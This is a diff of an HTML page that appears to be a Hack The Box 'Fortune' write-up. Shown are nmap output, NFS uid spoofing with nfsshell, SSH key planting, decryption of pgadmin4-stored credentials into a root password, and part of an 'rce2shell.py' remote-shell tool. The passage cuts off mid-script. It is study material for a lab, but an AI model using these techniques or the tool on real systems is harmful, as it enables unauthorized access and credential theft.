+</span><span class="go">|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
+</span><span class="go">|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
+</span><span class="go">80/tcp   open  http       OpenBSD httpd
+</span><span class="go">|_http-server-header: OpenBSD httpd
+</span><span class="go">|_http-title: Fortune
+</span><span class="go">111/tcp  open  rpcbind    2 (RPC #100000)
+</span><span class="go">| rpcinfo:
+</span><span class="go">|   program version   port/proto  service
+</span><span class="go">|   100000  2            111/tcp  rpcbind
+</span><span class="go">|   100000  2            111/udp  rpcbind
+</span><span class="go">|   100003  2,3         2049/tcp  nfs
+</span><span class="go">|   100003  2,3         2049/udp  nfs
+</span><span class="go">|   100005  1,3          817/tcp  mountd
+</span><span class="go">|_  100005  1,3          889/udp  mountd
+</span><span class="go">443/tcp  open  ssl/https?
+</span><span class="go">|_ssl-date: TLS randomness does not represent time
+</span><span class="go">817/tcp  open  mountd     1-3 (RPC #100005)
+</span><span class="go">2049/tcp open  nfs        2-3 (RPC #100003)
+</span><span class="go">8081/tcp open  http       OpenBSD httpd
+</span><span class="go">|_http-server-header: OpenBSD httpd
+</span><span class="go">|_http-title: pgadmin4
+</span><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span><span class="go">Aggressive OS guesses: OpenBSD 4.4 - 4.5 (95%), OpenBSD 6.0 - 6.1 (95%), OpenBSD 5.0 - 5.8 (95%), FreeBSD 10.0-CURRENT (94%), OpenBSD 4.0 (94%), OpenBSD 5.0 (93%), OpenBSD 4.1 (93%), OpenBSD 4.6 (93%), OpenBSD 4.7 (93%), OpenBSD 6.0 (93%)
+</span></code></pre></div></div></p>
 
 <p>Wow! Now, we have access to more ports! We notice an nfs service:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ showmount -e 10.10.10.127
-
-Export list for 10.10.10.127:
-/home (everyone)</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>showmount -e 10.10.10.127
+<span class="err">
+</span><span class="err"></span><span class="go">Export list for 10.10.10.127:
+</span><span class="go">/home (everyone)
+</span></code></pre></div></div></p>
 
 <h2 id="spoofing-uid-gid-using-nfsshell">Spoofing uid/gid using nfsshell</h2>
 
 <p>Neat, we have access to an nfs mount! We can use nfsshell to spoof our uid/gid:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nfsshell
-nfs&gt; host 10.10.10.127
-Using a privileged port (1023)
-Open 10.10.10.127 (10.10.10.127) TCP
-nfs&gt; export
-Export list for 10.10.10.127:
-/home   everyone
-nfs&gt; mount /home
-Using a privileged port (1022)
-Mount &#39;/home&#39;, TCP, transfer size 65536 bytes.
-nfs&gt; uid 1000
-nfs&gt; gid 1000
-nfs&gt; cd charlie
-nfs&gt; ls
-.
-..
-.Xdefaults
-.cshrc
-.cvsrc
-.login
-.mailrc
-.profile
-.ssh
-mbox
-user.txt
-nfs&gt; get user.txt
-nfs&gt; get mbox
-nfs&gt; quit
-Unmount &#39;/home&#39;
-Close &#39;10.10.10.127&#39;
-
-$ cat user.txt
-ad****************************40</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nfsshell
+<span class="go">nfs&gt; host 10.10.10.127
+</span><span class="go">Using a privileged port (1023)
+</span><span class="go">Open 10.10.10.127 (10.10.10.127) TCP
+</span><span class="go">nfs&gt; export
+</span><span class="go">Export list for 10.10.10.127:
+</span><span class="go">/home   everyone
+</span><span class="go">nfs&gt; mount /home
+</span><span class="go">Using a privileged port (1022)
+</span><span class="go">Mount &#39;/home&#39;, TCP, transfer size 65536 bytes.
+</span><span class="go">nfs&gt; uid 1000
+</span><span class="go">nfs&gt; gid 1000
+</span><span class="go">nfs&gt; cd charlie
+</span><span class="go">nfs&gt; ls
+</span><span class="go">.
+</span><span class="go">..
+</span><span class="go">.Xdefaults
+</span><span class="go">.cshrc
+</span><span class="go">.cvsrc
+</span><span class="go">.login
+</span><span class="go">.mailrc
+</span><span class="go">.profile
+</span><span class="go">.ssh
+</span><span class="go">mbox
+</span><span class="go">user.txt
+</span><span class="go">nfs&gt; get user.txt
+</span><span class="go">nfs&gt; get mbox
+</span><span class="go">nfs&gt; quit
+</span><span class="go">Unmount &#39;/home&#39;
+</span><span class="go">Close &#39;10.10.10.127&#39;
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span>cat user.txt
+<span class="go">ad****************************40
+</span></code></pre></div></div></p>
 
 <p>Alternatively, If you have a user with uid=1000, you can simply mount the nfs share and read charlie&rsquo;s files:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ mkdir mnt_point
-$ sudo mount -t nfs 10.10.10.127:/home mnt_point -o nolock
-$ cat mnt_point/charlie/user.txt
-ad****************************40</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>mkdir mnt_point
+<span class="gp">$ </span>sudo mount -t nfs 10.10.10.127:/home mnt_point -o nolock
+<span class="gp">$ </span>cat mnt_point/charlie/user.txt
+<span class="go">ad****************************40
+</span></code></pre></div></div></p>
 
 <h2 id="getting-charlie-shell">Getting charlie shell</h2>
 
 <p>Of course we can add our public key to charlie&rsquo;s authorized_keys:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cat ~/.ssh/id_rsa.pub &gt;&gt; mnt_point/charlie/.ssh/authorized_keys</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>cat ~/.ssh/id_rsa.pub &gt;&gt; mnt_point/charlie/.ssh/authorized_keys
+</code></pre></div></div></p>
 
 <p>Or we can use nfsshell for this as we did before:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nfsshell
-nfs&gt; host 10.10.10.127
-Using a privileged port (1023)
-Open 10.10.10.127 (10.10.10.127) TCP
-nfs&gt; mount /home
-Using a privileged port (1022)
-Mount &#39;/home&#39;, TCP, transfer size 65536 bytes.
-nfs&gt; uid 1000
-nfs&gt; gid 1000
-nfs&gt; cd charlie
-nfs&gt; cd .ssh
-nfs&gt; put id_rsa.pub authorized_keys
-WARNING: Create failed: File exists
-nfs&gt; quit
-Unmount &#39;/home&#39;
-Close &#39;10.10.10.127&#39;</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nfsshell
+<span class="go">nfs&gt; host 10.10.10.127
+</span><span class="go">Using a privileged port (1023)
+</span><span class="go">Open 10.10.10.127 (10.10.10.127) TCP
+</span><span class="go">nfs&gt; mount /home
+</span><span class="go">Using a privileged port (1022)
+</span><span class="go">Mount &#39;/home&#39;, TCP, transfer size 65536 bytes.
+</span><span class="go">nfs&gt; uid 1000
+</span><span class="go">nfs&gt; gid 1000
+</span><span class="go">nfs&gt; cd charlie
+</span><span class="go">nfs&gt; cd .ssh
+</span><span class="go">nfs&gt; put id_rsa.pub authorized_keys
+</span><span class="go">WARNING: Create failed: File exists
+</span><span class="go">nfs&gt; quit
+</span><span class="go">Unmount &#39;/home&#39;
+</span><span class="go">Close &#39;10.10.10.127&#39;
+</span></code></pre></div></div></p>
 
 <p>Now, we can connect via SSH using public key authenticaion:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ ssh -i ~/.ssh/id_rsa2 charlie@10.10.10.127
-Last login: Sat Aug  3 04:36:55 2019 from 10.10.12.158
-OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018
-
-Welcome to OpenBSD: The proactively secure Unix-like operating system.
-fortune$</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>ssh -i ~/.ssh/id_rsa2 charlie@10.10.10.127
+<span class="go">Last login: Sat Aug  3 04:36:55 2019 from 10.10.12.158
+</span><span class="go">OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Welcome to OpenBSD: The proactively secure Unix-like operating system.
+</span><span class="go">fortune$
+</span></code></pre></div></div></p>
 
 <h2 id="privilege-escalation">Privilege escalation</h2>
 
 <p>Let&rsquo;s examine what there is inside &lsquo;mbox&rsquo; file:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cat mbox
-
-From bob@fortune.htb Sat Nov  3 11:18:51 2018
-Return-Path: &lt;bob@fortune.htb&gt;
-Delivered-To: charlie@fortune.htb
-Received: from localhost (fortune.htb [local])
-	by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
-	for &lt;charlie@fortune.htb&gt;;
-	Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
-From:  &lt;bob@fortune.htb&gt;
-Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
-To: charlie@fortune.htb
-Subject: pgadmin4
-Message-ID: &lt;196699abe1fed384@fortune.htb&gt;
-Status: RO
-
-Hi Charlie,
-
-Thanks for setting-up pgadmin4 for me. Seems to work great so far.
-BTW: I set the dba password to the same as root. I hope you don&#39;t mind.
-
-Cheers,
-
-Bob</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>cat mbox
+<span class="err">
+</span><span class="err"></span><span class="go">From bob@fortune.htb Sat Nov  3 11:18:51 2018
+</span><span class="go">Return-Path: &lt;bob@fortune.htb&gt;
+</span><span class="go">Delivered-To: charlie@fortune.htb
+</span><span class="go">Received: from localhost (fortune.htb [local])
+</span><span class="go">	by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
+</span><span class="go">	for &lt;charlie@fortune.htb&gt;;
+</span><span class="go">	Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
+</span><span class="go">From:  &lt;bob@fortune.htb&gt;
+</span><span class="go">Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
+</span><span class="go">To: charlie@fortune.htb
+</span><span class="go">Subject: pgadmin4
+</span><span class="go">Message-ID: &lt;196699abe1fed384@fortune.htb&gt;
+</span><span class="go">Status: RO
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Hi Charlie,
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Thanks for setting-up pgadmin4 for me. Seems to work great so far.
+</span><span class="go">BTW: I set the dba password to the same as root. I hope you don&#39;t mind.
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Cheers,
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Bob
+</span></code></pre></div></div></p>
 
 <p>Password reuse&hellip; Let&rsquo;s search /var/appsrv/pgadmin4/pgadmin4.db:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">fortune$ strings /var/appsrv/pgadmin4/pgadmin4.db | grep bob
-bob@fortune.htb$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
-
-fortune$ strings /var/appsrv/pgadmin4/pgadmin4.db | grep charlie
-charlie@fortune.htb$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ
-
-fortune$ strings /var/appsrv/pgadmin4/pgadmin4.db | grep dba
-postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGzprefer&lt;STORAGE_DIR&gt;/.postgresql/postgresql.crt&lt;STORAGE_DIR&gt;/.postgresql/postgresql.key22</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">fortune$ strings /var/appsrv/pgadmin4/pgadmin4.db | grep bob
+</span><span class="go">bob@fortune.htb$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">fortune$ strings /var/appsrv/pgadmin4/pgadmin4.db | grep charlie
+</span><span class="go">charlie@fortune.htb$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">fortune$ strings /var/appsrv/pgadmin4/pgadmin4.db | grep dba
+</span><span class="go">postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGzprefer&lt;STORAGE_DIR&gt;/.postgresql/postgresql.crt&lt;STORAGE_DIR&gt;/.postgresql/postgresql.key22
+</span></code></pre></div></div></p>
 
 <p>Luckily for us, pgadmin4 is open source. Let&rsquo;s grab this script:</p>
 
 <p><a href="https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py" target="_blank">https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py</a></p>
 
 <p>All we need to do is to add one line in the end:
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">##########################################################################</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1">##########################################################################</span>
 <span class="c1">#</span>
 <span class="c1"># pgAdmin 4 - PostgreSQL Tools</span>
 <span class="c1">#</span>
@@ -790,24 +812,26 @@ postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgE
     <span class="k">return</span> <span class="n">key</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="n">padding_string</span><span class="p">)</span>
 
 
-<span class="k">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="s2">&#34;utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz&#34;</span><span class="p">,</span> <span class="s2">&#34;$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg&#34;</span><span class="p">))</span></code></pre></div></p>
+<span class="nb">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="s2">&#34;utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz&#34;</span><span class="p">,</span> <span class="s2">&#34;$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg&#34;</span><span class="p">))</span></code></pre></div></p>
 
 <p>That is we use the &lsquo;decrypt&rsquo; function to decrypt dba&rsquo;s password which was encrypted using Bob&rsquo;s AES encyption key. PBKDF2 (Password-Based Key Derivation Function 2) is a key derivation function with a sliding computational cost (to reduce susceptibility to brute force attacks).
 We run the script and we get the password for root:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ python crypto.py 
-b&#39;R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!&#39;</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>python crypto.py 
+<span class="go">b&#39;R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!&#39;
+</span></code></pre></div></div></p>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">fortune$ su root
-Password: R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
-fortune# cat /root/root.txt
-33****************************f8</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">fortune$ su root
+</span><span class="go">Password: R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
+</span><span class="go">fortune# cat /root/root.txt
+</span><span class="go">33****************************f8
+</span></code></pre></div></div>
 
 <h1 id="bonus-script-rce2shell-py">Bonus script: rce2shell.py</h1>
 
 <p>Sometimes, we have some kind of Remote Command Execution but we cannot gain a full working shell (due to firewalls et.c). I wrote this <a href="https://github.com/Alamot/code-snippets/blob/master/rce2shell/rce2shell.py" target="_blank">script</a> for such cases. It tries to emulate a shell experience. Moreover, it offers download/upload capabilities using a variety of OS tools. Note, though, that this is still work in progress. In the future, I would like to make it quite broad in the sense of OSes/tools and RCEs it supports. But I don&rsquo;t know if I ever find the time to do that.</p>
 
 <p>Anyway, for the time being, you can try it on the Fortune box.
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
 <span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
 <span class="c1"># Author: Alamot</span>
 <span class="c1"># Status: WIP (Work In Progress)</span>
@@ -842,15 +866,15 @@ fortune# cat /root/root.txt
 <span class="k">try</span><span class="p">:</span>
     <span class="c1"># Python 2.X</span>
     <span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">quote</span>
-    <span class="nb">input</span> <span class="o">=</span> <span class="nb">raw_input</span>
+    <span class="nb">input</span> <span class="o">=</span> <span class="n">raw_input</span>
 <span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
     <span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>  <span class="c1"># Python 3+</span>
 
 
-<span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">False</span>
 <span class="n">BUFFER_SIZE</span> <span class="o">=</span> <span class="mi">5000</span>
 <span class="c1"># Redirect stderr to stdout?</span>
-<span class="n">ERR2OUT</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="n">ERR2OUT</span> <span class="o">=</span> <span class="kc">True</span>
 <span class="c1"># A unique sequence of characters that marks start/end of output.</span>
 <span class="n">UNIQUE_SEQ</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">6</span><span class="p">]</span>
 <span class="n">UNIX_TOOLS</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;b64enc&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;base64&#34;</span><span class="p">:</span><span class="s2">&#34;base64&#34;</span><span class="p">,</span>
@@ -874,16 +898,16 @@ fortune# cat /root/root.txt
   <span class="k">return</span> <span class="n">wrapper</span>
 
 
-<span class="k">def</span> <span class="nf">send_command</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">rce</span><span class="p">,</span> <span class="n">enclose</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">send_command</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">rce</span><span class="p">,</span> <span class="n">enclose</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
     <span class="k">try</span><span class="p">:</span>
         <span class="n">client</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
-        <span class="n">client</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>
-        <span class="n">client</span><span class="o">.</span><span class="n">keep_alive</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">client</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="n">client</span><span class="o">.</span><span class="n">keep_alive</span> <span class="o">=</span> <span class="kc">False</span>
         <span class="k">if</span> <span class="n">enclose</span><span class="p">:</span>
             <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;echo &#34;</span> <span class="o">+</span> <span class="n">UNIQUE_SEQ</span> <span class="o">+</span> <span class="s2">&#34;;&#34;</span> <span class="o">+</span> <span class="n">command</span> <span class="o">+</span> <span class="s2">&#34;;echo &#34;</span> <span class="o">+</span> <span class="n">UNIQUE_SEQ</span>
         <span class="k">else</span><span class="p">:</span>
             <span class="n">cmd</span> <span class="o">=</span> <span class="n">command</span>
-        <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
         <span class="k">if</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;method&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;GET&#34;</span><span class="p">:</span>
             <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">rce</span><span class="p">[</span><span class="s2">&#34;timeout&#34;</span><span class="p">])</span>
         <span class="k">elif</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;method&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
@@ -893,14 +917,14 @@ fortune# cat /root/root.txt
                                    <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
                                    <span class="n">timeout</span><span class="o">=</span><span class="n">rce</span><span class="p">[</span><span class="s2">&#34;timeout&#34;</span><span class="p">])</span>
         <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Status: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
-        <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Status: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
+        <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
         <span class="k">if</span> <span class="n">enclose</span><span class="p">:</span>
             <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">UNIQUE_SEQ</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
         <span class="k">else</span><span class="p">:</span>
             <span class="k">return</span> <span class="n">response</span>
     <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
     <span class="k">finally</span><span class="p">:</span>
         <span class="k">if</span> <span class="n">client</span><span class="p">:</span>
             <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
@@ -913,29 +937,29 @@ fortune# cat /root/root.txt
         <span class="n">response</span> <span class="o">=</span> <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">)</span>
         <span class="k">if</span> <span class="s2">&#34;FOUND&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
             <span class="k">return</span> <span class="n">UNIX_TOOLS</span><span class="p">[</span><span class="n">tool_type</span><span class="p">][</span><span class="n">tool_name</span><span class="p">]</span>
-    <span class="k">return</span> <span class="bp">None</span>
+    <span class="k">return</span> <span class="kc">None</span>
 
 
 <span class="k">def</span> <span class="nf">download</span><span class="p">(</span><span class="n">rce</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">):</span>
     <span class="n">cmd</span> <span class="o">=</span> <span class="n">find_tool</span><span class="p">(</span><span class="s2">&#34;md5sum&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34; &#39;&#34;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s2">&#34;&#39;&#34;</span>
-    <span class="n">response</span> <span class="o">=</span> <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">,</span> <span class="n">enclose</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">,</span> <span class="n">enclose</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
     <span class="n">remote_md5sum</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">strip</span><span class="p">()[:</span><span class="mi">32</span><span class="p">]</span>
     <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;cat &#39;&#34;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s2">&#34;&#39; | &#34;</span> <span class="o">+</span> <span class="n">find_tool</span><span class="p">(</span><span class="s2">&#34;b64enc&#34;</span><span class="p">)</span>
-    <span class="n">b64content</span> <span class="o">=</span> <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">,</span> <span class="n">enclose</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">b64content</span> <span class="o">=</span> <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">,</span> <span class="n">enclose</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
     <span class="n">content</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">b64content</span><span class="p">)</span>
     <span class="n">local_md5sum</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">content</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
-    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Remote md5sum: &#34;</span> <span class="o">+</span> <span class="n">remote_md5sum</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s2">&#34; Local md5sum: &#34;</span> <span class="o">+</span> <span class="n">local_md5sum</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Remote md5sum: &#34;</span> <span class="o">+</span> <span class="n">remote_md5sum</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34; Local md5sum: &#34;</span> <span class="o">+</span> <span class="n">local_md5sum</span><span class="p">)</span>
     <span class="k">if</span>  <span class="n">local_md5sum</span> <span class="o">==</span> <span class="n">remote_md5sum</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;               MD5 hashes match!&#34;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;               MD5 hashes match!&#34;</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;               ERROR! MD5 hashes do NOT match!&#34;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;               ERROR! MD5 hashes do NOT match!&#34;</span><span class="p">)</span>
     <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">remote_path</span><span class="p">),</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
         <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">rce</span><span class="p">,</span> <span class="n">local_path</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">):</span>
-    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Uploading &#34;</span><span class="o">+</span><span class="n">local_path</span><span class="o">+</span><span class="s2">&#34; to &#34;</span><span class="o">+</span><span class="n">remote_path</span><span class="p">)</span>
